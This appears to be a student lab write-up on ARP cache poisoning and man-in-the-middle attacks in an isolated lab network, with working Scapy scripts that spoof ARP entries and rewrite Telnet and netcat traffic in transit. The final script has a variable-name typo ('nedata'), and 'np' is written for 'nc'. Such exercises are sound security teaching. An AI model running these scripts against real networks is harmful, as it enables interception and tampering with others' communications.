# AITM AND ARP CACHE POISONING

## 1. ARP CACHE POISONING

The objective of the first part is to gain some familiarity with ARP spoofing.  
The setup includes three machines in the same local network, two are victims (**A**, **B**) while one is the attacker (`M`).

These machines have the following information:

| Machine | IP address | MAC address |
| ------- | ---------- | ----------- |
| M       | 10.9.0.105 | 02:42:0a:09:00:69 | 
| A       | 10.9.0.5   | 02:42:0a:09:00:05 |
| B       | 10.9.0.6   | 02:42:0a:09:00:06 |


and will be identified using `MAC_A` or `IP_M` from now on.

### 1.1. ARP Request

The task was to construct an ARP request on host `M` to map `B`'s IP address to `M`'s MAC address.  
To perform such operation the following python script was used:
```python
from scapy.all import *

E = Ether(src=MAC_M, dst=MAC_A)
A = ARP(psrc=IP_B, pdst=IP_A, hwsrc=MAC_M)
A.op = 1

pkt = E/A
sendp(pkt)
```

this successfully manages to poison the APR cache of `A` as results from:

```
$ arp -n
Address     HWtype  HWaddress           Flags Mask  Iface
10.9.0.6    ether   02:42:0a:09:00:69   C           eth0
```

### 1.2. ARP Reply

The task was to construct an ARP reply on host `M` to map `B`' IP address to `M`'s MAC address. The attack is tested against two scenarios:
+ `B` is already in `A`'s cache.
+ `B` isn't

The script used is:
```python
from scapy.all import *

E = Ether(src=MAC_M, dst=MAC_A)
A = ARP(psrc=IP_B, pdst=IP_A, hwdst=MAC_M, hwsrc=MAC_M)
A.op = 2

pkt = E/A
sendp(pkt)
```

Now in the two scenarios the content of `A`'s ARP cache will be different:
+ If `B` is already in `A`'s cache then the operations succeeds
+ otherwise it fails and the cache is empty

In the first scenario the cache has the same content as in the previous task.

### 1.3. Gratuitous ARP

The task consists in constructing a gratuitous ARP  and use it to map `B`'s IP address to `M`'s MAC address. Also in this case we consider the two scenarios.

The code to perform the attack is as follows:
```python
from scapy.all import *

E = Ether(src=MAC_M, dst=MAC_BCAST)
A = ARP(psrc=IP_B, pdst=IP_B, hwsrc=MAC_M, hwdst=MAC_BCAST)
A.op = 1

pkt = E/A
sendp(pkt)
```

Also in this case the content of `A`'s cache is filled only if it already contains an entry for `B`.

## 2. MITM ATTACK ON TELNET

Host `A` and `B` are communicating using telnet. `M` wants to intercept their communication so it can make changes to the data sent between `A` and `B`.  
In order for the attack to succeed some steps must be taken:

### 2.1. ARP Cache Poisoning Attack

`M` conducts an ARP poisoning attack on `A` and `B` to map each other's MAC address with `M`'s. Packets sent by `A` and `B` will then pass through `M`.  
We must make sure that both hosts are communicating through `M` for the whole duration of the operation, so periodic packages must be sent
```python
from scapy.all import *
import time

pkt_A = Ether(src=MAC_M, dst=MAC_BCAST)/ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, op=1)
pkt_B = Ether(src=MAC_M, dst=MAC_BCAST)/ARP(psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, op=1)

while True:
    sendp(pkt_A)
    sendp(pkt_B)
    time.sleep(5)
```

This will be enough to setup the environment.

### 2.2. Testing

After the attack is successful it is possible to ping the two hosts.  
If the IP forwarding is turned off with `sysctl net.ipv4.ip_forward=0` then no packet can reach the two hosts anymore.

```
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.

--- 10.9.0.6 ping statistics ---
1 packet transmitted, 0 received, 100% packet loss, time 0ms
```

### 2.3 IP Forwarding

Now IP forwarding is turned on again and packets reach the two hosts, meaning that the MITM attack was a success:

```
PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.454 ms

--- 10.9.0.6 ping statistics ---
1 packet transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.454/0.454/0.454/0.000 ms
```

### 2.4 MITM Attack
The objective is to spoof the Telnet connection between `A` and `B` using `M` as AITM. For every key stroke typed on `A`'s Telnet window, a TCP packet is generated and sent to `B`.  
Each typed character will then be replaced by `M` with the character `z`.  
Instead of simply forwarding packets to `M` now they will be replaced by the spoofed version. The steps to do so are:
+ [Spoof the content of the ARP caches](#21-arp-cache-poisoning-attack) of `A` and `B`.
+ [Turn on IP forwarding](#23-ip-forwarding) so that the Telnet connection can be established
+ [Turn it off](#22-testing) so that no packet can reach `A` or `B`
+ Activate the `sniff_and_spoof` script to perform the attack;

The content of such script is as follows:
```python
from scapy.all import *

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # New packet is based on the caputred one
        # Checksum and payload are removed to avoid errors
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if not pkt[TCP].payload:
            send(newpkt) # No payload
        else:
            data = pkt[TCP].payload.load # The original payload data
            newdata = b''
            for byte in data:
                if byte <= 0x20: # Whitespace character
                    newdata += bytes([byte])
                else:
                    newdata += b'z'
            send(newpkt/newdata)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)
f = f'tcp and not ether src {MAC_M}'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

The results are as shown in the image:  
![Che dovrei scrivere qui?](images/telnet.png)

## 3. MITM ATTACK ON NETCAT

Using a similar setup wrt the previous example we reproduce the attack while the hosts communicate using `netcat`:
+ `B` listens for connections with `nc -lp 9090`
+ `A` connects to it using `np 10.9.0.6`

With minimal changes to the previous script we can now substitute each instance of the user's name ('_alessandro_') with a sequence of `a` of the same length.
```python
from scapy.all import *

NAME = b'alessandro'
REPL = b'a'  * len(NAME)

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # New packet is based on the caputred one
        # Checksum and payload are removed to avoid errors
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        if not pkt[TCP].payload:
            send(newpkt) # No payload
        else:
            data = pkt[TCP].payload.load # The original payload data
            nedata = data.replace(NAME, REPL)
            send(newpkt/newdata)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)
f = f'tcp and not ether src {MAC_M}'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

This results in the exchange of the following messages:
![PRospettiva A](images/nc_doppio.png)
On the left we can observe the communication from `A`'s perspective while on the right we see `B`'s.